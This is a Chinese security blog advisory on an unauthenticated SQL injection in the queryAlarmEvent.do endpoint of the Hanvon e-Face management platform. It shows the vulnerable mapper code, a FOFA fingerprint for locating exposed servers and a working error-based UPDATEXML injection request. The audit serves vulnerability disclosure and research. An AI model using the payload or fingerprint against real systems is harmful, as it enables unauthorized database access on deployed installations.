---
title: "汉王e脸通综合管理平台 queryAlarmEvent.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryAlarmEvent-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryalarmevent.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryAlarmEvent.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/7 12:27
* 937浏览
* [0评论](#comment)
* 29分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryAlarmEvent.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `AlarmEventController` 里关于 `queryAlarmEvent` 的实现

```
@RequestMapping(
        value = {"queryAlarmEvent.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson getEventTypeList(@RequestParam(required = false) Integer page, Integer pageSize, String doorName, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();

        try {
            AlarmStatusVO record = new AlarmStatusVO();
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            if (doorName != null) {
                record.setDoorName(doorName);
            }

            record.setOrder(order);
            record.setColumnKey(columnKey);
            PageHelper.startPage(page, pageSize);
            List<AlarmStatusVO> alarmEventList = this.alarmEventService.queryList(record);
            PageInfo<AlarmStatusVO> info = new PageInfo(alarmEventList);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AlarmStatusDao.xml

```
<select id="queryList" resultType="com.hanvon.iface.tpm.access.AlarmStatusVO">
      SELECT *,ddi.name as doorName,et.`NAME` eventDetail
      FROM
      ALARM_STATUS a
      LEFT JOIN ACCESS_DOOR_INFO ddi on ddi.ID = a.DOOR_ID
      LEFT JOIN EVENT_TYPE et on a.ALARM_TYPE = et.ID
      WHERE 1 = 1
      <if test="doorName != null and doorName != ''">
          and ddi.NAME like CONCAT(CONCAT('%', #{doorName}, '%'))
      </if>
      <if test="domainId != null">
        and a.DOMAIN_ID = #{domainId,jdbcType=INTEGER}
      </if>
      <if test="doorIds != null">
        and a.DOOR_ID in
        <foreach close=")" collection="doorIds" index="index" item="item" open="(" separator=",">
          #{item}
        </foreach>
      </if>
      order by
      <if test="order == null or order == ''">
        a.TIME desc
      </if>
      <if test="order != null and order != ''">
        ${columnKey} ${order}
      </if>
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/alarm/queryAlarmEvent.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryAlarmEvent.do SQL注入漏洞](images/img-001-ee0cbf5fc89e.webp)](https://image.mrxn.net/39fe0a8ce92f41fbb3f8ddc3edb8815f.webp)

成功利用报错注入获取到数据版本号

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 queryAlarmEvent.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryAlarmEvent-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-queryAlarmEvent-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryAlarmEvent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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